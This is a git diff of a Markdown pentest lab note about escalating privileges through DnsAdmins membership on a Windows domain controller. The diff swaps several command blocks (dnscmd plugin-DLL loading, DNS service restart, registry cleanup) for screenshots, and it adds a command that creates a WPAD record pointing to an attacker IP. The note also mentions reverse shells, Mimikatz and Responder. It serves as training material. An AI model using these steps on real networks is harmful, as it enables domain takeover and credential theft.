@@ -19,7 +19,6 @@ https://adsecurity.org/?p=4064
 
 - When the DNS service is restarted, the DLL in this path will be loaded 
 - (ie, a network share DC can access).
-
 - An attacker can load a custom DLL to obtain a reverse shell or load tools like Mimikatz as a DLL.
 
 ## Leveraging DnsAdmins Access
@@ -32,48 +31,58 @@ msfvenom - windows/x64/exec cmd=
 sudo python3 -m http.server 7777
 ```
 
-- Download the DLL to the target
-- Use the `dnscmd` utility to load a custom DLL with non-privileged user and...
+#### Download the DLL to the target
 
-```
-dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
-( Access Denied )
-```
+![[Pasted image 20230107142718.png]]
+
+#### Load DLL as Non-Privileged User
+
+![[Pasted image 20230107142759.png]]
 
 - Only DnsAdmins are allowed to perform this, as expected. WHOOPS?
 - We need to load this DLL as a DnsAdmin:
 
-```
-Get-ADGroupMember -Identity DnsAdmins
-dnscmd.exe /config /serverlevelplugindll C:\Users\netadmn\Desktop\adduser.dll
-```
+#### Loading DLL as Member of DnsAdmins
+
+![[Pasted image 20230107142842.png]]
+
+#### Loading Custom DLL
+
+![[Pasted image 20230107142918.png]]
 
 Once the DLL is added we can either restart the DNS service if we have the rights or we would 
-wait for a server restart.
-
-Check our current user's permissions on the DNS Service.
+wait for a server restart. Once restarted, we should be able to run our custom DLL and add a
+user or get a reverse shell
 
 ##### Finding User's SID for the DNS Service
-```
-wmic useraccount where name="netadm" get sid
-sc.exe sdshow DNS
-sc stop dns
-sc start dns
-net group "Domain Admins" /dom
-```
 
-Here's an explaination of Security Descriptor Definition Language (SDDL) syntax:
-https://academy.hackthebox.com/module/49/section/1016
+![[Pasted image 20230107143353.png]]
+
+#### Check Permissions on DNS Service
+https://www.winhelponline.com/blog/view-edit-service-permissions-windows/ for SDDL translation
+
+![[Pasted image 20230107143536.png]]
+
+#### Stop/Start Service
+
+![[Pasted image 20230107143557.png]]
+![[Pasted image 20230107143638.png]]
+
+#### Confirm Group Membership
+
+![[Pasted image 20230107143657.png]]
 
 ## Cleaning Up For Our Customer
 
-```
-reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
-reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
-					/v ServerLevelPluginDll
-sc.exe start dns
-sc query dns
-```
+#### Confirm Registry Key Added/ Delete Registry Key
+
+![[Pasted image 20230107143745.png]]
+![[Pasted image 20230107143820.png]]
+![[Pasted image 20230107143847.png]]
+
+#### Check DNS Status
+
+![[Pasted image 20230107143905.png]]
 
 ## Using Mimilib.dll
 
@@ -121,6 +130,8 @@ DWORD WINAPI kdns_DnsPluginQuery(
 
 ## Creating a WPAD Record
 
+https://learn.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2022-ps
+
 Membership in this group gives us the rights to disable global-query blocking security, 
 which will block this attack by default.
 
@@ -137,9 +148,11 @@ We could use a tool like Responder or Inveigh to perform traffic spoofing and at
 password hashes and crack them offline, or perform an SMBRelay attack.
 
 ##### Disabling the Global Query Block List
-```
-Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
-Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local 
-	-ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
-```
 
+![[Pasted image 20230107143953.png]]
+
+#### Adding a WPAD Record
+
+```powershell-session
+C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+```
